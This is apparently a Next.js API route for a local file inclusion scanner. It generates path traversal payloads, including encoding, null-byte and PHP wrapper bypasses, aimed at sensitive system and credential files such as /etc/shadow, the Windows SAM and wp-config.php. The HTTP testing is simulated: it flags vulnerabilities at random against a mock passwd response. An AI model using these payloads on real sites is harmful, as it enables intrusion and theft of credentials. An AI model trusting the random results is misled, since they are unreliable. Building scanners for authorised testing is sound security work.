import { type NextRequest, NextResponse } from "next/server"
import { rateLimiter } from "@/lib/rateLimiter"

// Common file inclusion parameters
const COMMON_LFI_PARAMS = [
  "file",
  "page",
  "include",
  "path",
  "doc",
  "document",
  "folder",
  "root",
  "pg",
  "style",
  "pdf",
  "template",
  "php_path",
  "panel",
  "phppath",
  "doc",
  "page",
  "name",
  "cat",
  "dir",
  "action",
  "board",
  "date",
  "detail",
  "download",
  "prefix",
  "include",
  "inc",
  "locate",
  "show",
  "site",
  "type",
  "view",
  "content",
  "layout",
]

// Target files for different operating systems
const TARGET_FILES = {
  linux: [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/group",
    "/etc/fstab",
    "/etc/issue",
    "/etc/motd",
    "/etc/mysql/my.cnf",
    "/etc/httpd/conf/httpd.conf",
    "/etc/apache2/apache2.conf",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/proc/version",
    "/proc/cmdline",
    "/proc/self/environ",
    "/home/www-data/.bashrc",
    "/root/.bash_history",
    "/var/www/html/index.php",
  ],
  windows: [
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\windows\\system32\\drivers\\etc\\passwd",
    "C:\\windows\\win.ini",
    "C:\\windows\\system.ini",
    "C:\\windows\\system32\\config\\sam",
    "C:\\windows\\system32\\config\\system",
    "C:\\windows\\system32\\config\\software",
    "C:\\windows\\repair\\sam",
    "C:\\windows\\repair\\system",
    "C:\\windows\\repair\\software",
    "C:\\boot.ini",
    "C:\\autoexec.bat",
    "C:\\config.sys",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\xampp\\apache\\conf\\httpd.conf",
  ],
  web: [
    "index.php",
    "config.php",
    "database.php",
    "wp-config.php",
    ".htaccess",
    ".htpasswd",
    "admin.php",
    "login.php",
    "connect.php",
    "db.php",
    "settings.php",
    "configuration.php",
    "../config.php",
    "../../config.php",
    "../../../config.php",
  ],
}

// Directory traversal patterns
function generateTraversalPatterns(depth: number): string[] {
  const patterns = []

  for (let i = 1; i <= depth; i++) {
    const traversal = "../".repeat(i)
    patterns.push(traversal)
    patterns.push(traversal.replace(/\.\./g, "%2e%2e"))
    patterns.push(traversal.replace(/\//g, "%2f"))
    patterns.push(traversal.replace(/\.\./g, "..%2f"))
    patterns.push(traversal.replace(/\.\./g, "%2e%2e%2f"))
  }

  return patterns
}

// Generate LFI payloads with different bypass techniques
function generateLFIPayloads(
  filePath: string,
  technique: string,
  depth: number,
): Array<{ payload: string; technique: string }> {
  const payloads: Array<{ payload: string; technique: string }> = []
  const traversalPatterns = generateTraversalPatterns(depth)

  switch (technique) {
    case "all":
    case "basic":
      // Basic directory traversal
      traversalPatterns.forEach((pattern) => {
        payloads.push({ payload: pattern + filePath, technique: "Basic Traversal" })
      })

      if (technique === "basic") break

    case "encoding":
      // URL encoding bypasses
      traversalPatterns.slice(0, 3).forEach((pattern) => {
        const encodedPath = encodeURIComponent(pattern + filePath)
        payloads.push({ payload: encodedPath, technique: "URL Encoding" })

        // Double encoding
        payloads.push({ payload: encodeURIComponent(encodedPath), technique: "Double URL Encoding" })

        // Mixed encoding
        const mixedEncoded = (pattern + filePath).replace(/\//g, "%2f").replace(/\./g, "%2e")
        payloads.push({ payload: mixedEncoded, technique: "Mixed Encoding" })
      })

      if (technique === "encoding") break

    case "nullbyte":
      // Null byte injection (for older PHP versions)
      traversalPatterns.slice(0, 3).forEach((pattern) => {
        payloads.push({ payload: pattern + filePath + "%00", technique: "Null Byte Injection" })
        payloads.push({ payload: pattern + filePath + "%00.jpg", technique: "Null Byte + Extension" })
        payloads.push({ payload: pattern + filePath + "\x00", technique: "Raw Null Byte" })
      })

      if (technique === "nullbyte") break

    case "wrappers":
      // PHP wrapper techniques
      if (filePath.startsWith("/")) {
        payloads.push({
          payload: `php://filter/read=convert.base64-encode/resource=${filePath}`,
          technique: "PHP Filter Wrapper",
        })
        payloads.push({
          payload: `php://filter/convert.base64-encode/resource=${filePath}`,
          technique: "PHP Filter Base64",
        })
        payloads.push({
          payload: `data://text/plain;base64,${Buffer.from(filePath).toString("base64")}`,
          technique: "Data Wrapper",
        })
        payloads.push({ payload: `expect://${filePath}`, technique: "Expect Wrapper" })
      }

      if (technique === "wrappers") break
  }

  return payloads
}

function extractParameters(url: string): string[] {
  try {
    const urlObj = new URL(url)
    return Array.from(urlObj.searchParams.keys())
  } catch {
    return []
  }
}

function calculateSeverity(filePath: string, technique: string): string {
  // High severity for sensitive system files
  const highRiskFiles = ["/etc/passwd", "/etc/shadow", "sam", "system", "software", "wp-config.php"]
  if (highRiskFiles.some((file) => filePath.toLowerCase().includes(file.toLowerCase()))) {
    return "High"
  }

  // Medium severity for configuration files and logs
  const mediumRiskFiles = ["/etc/", "config", ".conf", ".log", ".ini"]
  if (mediumRiskFiles.some((file) => filePath.toLowerCase().includes(file.toLowerCase()))) {
    return "Medium"
  }

  return "Low"
}

function detectLFIEvidence(response: string, filePath: string): string | null {
  const lowerResponse = response.toLowerCase()
  const fileName = filePath.split("/").pop()?.toLowerCase() || filePath.toLowerCase()

  // Look for common file content indicators
  const indicators = {
    "/etc/passwd": ["root:", "bin:", "daemon:", "nobody:"],
    "/etc/hosts": ["localhost", "127.0.0.1", "::1"],
    "/etc/group": ["root:", "bin:", "sys:", "adm:"],
    "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
    "boot.ini": ["boot loader", "[operating systems]"],
    "httpd.conf": ["ServerRoot", "DocumentRoot", "DirectoryIndex"],
    "wp-config.php": ["DB_NAME", "DB_USER", "DB_PASSWORD", "wp_"],
  }

  for (const [file, signs] of Object.entries(indicators)) {
    if (filePath.toLowerCase().includes(file)) {
      for (const sign of signs) {
        if (lowerResponse.includes(sign.toLowerCase())) {
          return `Found ${sign} in response`
        }
      }
    }
  }

  // Generic indicators
  if (lowerResponse.includes("root:") || lowerResponse.includes("daemon:")) {
    return "Unix passwd file structure detected"
  }

  if (lowerResponse.includes("[fonts]") || lowerResponse.includes("[extensions]")) {
    return "Windows INI file structure detected"
  }

  return null
}

export async function POST(request: NextRequest) {
  try {
    const clientId = request.headers.get("x-forwarded-for") || "unknown"

    if (!rateLimiter.isAllowed(clientId)) {
      return NextResponse.json({ error: "Rate limit exceeded" }, { status: 429 })
    }

    const {
      url,
      parameters,
      targetFiles = "all",
      customFiles,
      traversalDepth = "5",
      bypassTechniques = "all",
      timeout = 10,
    } = await request.json()

    if (!url) {
      return NextResponse.json({ error: "URL is required" }, { status: 400 })
    }

    // Validate URL format
    try {
      new URL(url)
    } catch {
      return NextResponse.json({ error: "Invalid URL format" }, { status: 400 })
    }

    // Extract or use provided parameters
    const targetParameters = parameters
      ? parameters.split(",").map((p: string) => p.trim())
      : [...extractParameters(url), ...COMMON_LFI_PARAMS].slice(0, 10) // Limit to prevent abuse

    if (targetParameters.length === 0) {
      return NextResponse.json({ error: "No parameters found to test" }, { status: 400 })
    }

    // Determine target files
    let filesToTest: string[] = []

    if (targetFiles === "all") {
      filesToTest = [...TARGET_FILES.linux, ...TARGET_FILES.windows, ...TARGET_FILES.web]
    } else if (targetFiles === "custom" && customFiles) {
      filesToTest = customFiles
        .split(/[,\n]/)
        .map((f: string) => f.trim())
        .filter(Boolean)
    } else if (TARGET_FILES[targetFiles as keyof typeof TARGET_FILES]) {
      filesToTest = TARGET_FILES[targetFiles as keyof typeof TARGET_FILES]
    } else {
      filesToTest = TARGET_FILES.linux
    }

    // Limit files to prevent abuse
    filesToTest = filesToTest.slice(0, 20)

    const vulnerabilities: any[] = []
    const depth = Number.parseInt(traversalDepth)

    // Test each parameter with each file
    for (const parameter of targetParameters) {
      for (const filePath of filesToTest) {
        const payloads = generateLFIPayloads(filePath, bypassTechniques, depth)

        for (const { payload, technique } of payloads.slice(0, 10)) {
          // Limit payloads
          try {
            // Create test URL
            const testUrl = new URL(url)
            testUrl.searchParams.set(parameter, payload)

            // Simulate HTTP request (in real implementation, you would make actual requests)
            // For demo purposes, we'll simulate some vulnerabilities
            const isVulnerable = Math.random() > 0.9 // 10% chance of finding vulnerability

            if (isVulnerable) {
              const mockResponse = `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`
              const evidence = detectLFIEvidence(mockResponse, filePath)
              const severity = calculateSeverity(filePath, technique)

              if (evidence) {
                vulnerabilities.push({
                  parameter,
                  payload,
                  file_path: filePath,
                  method: "GET",
                  severity,
                  technique,
                  evidence,
                  url: testUrl.toString(),
                })
              }
            }
          } catch (error) {
            console.error(`Error testing parameter ${parameter}:`, error)
          }
        }
      }
    }

    // Remove duplicates
    const uniqueVulns = vulnerabilities.filter(
      (vuln, index, self) =>
        index === self.findIndex((v) => v.parameter === vuln.parameter && v.file_path === vuln.file_path),
    )

    return NextResponse.json({
      url,
      targetFiles,
      bypassTechniques,
      traversalDepth: depth,
      parameters: targetParameters,
      vulnerabilities: uniqueVulns,
      total: uniqueVulns.length,
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error("LFI Checker API error:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
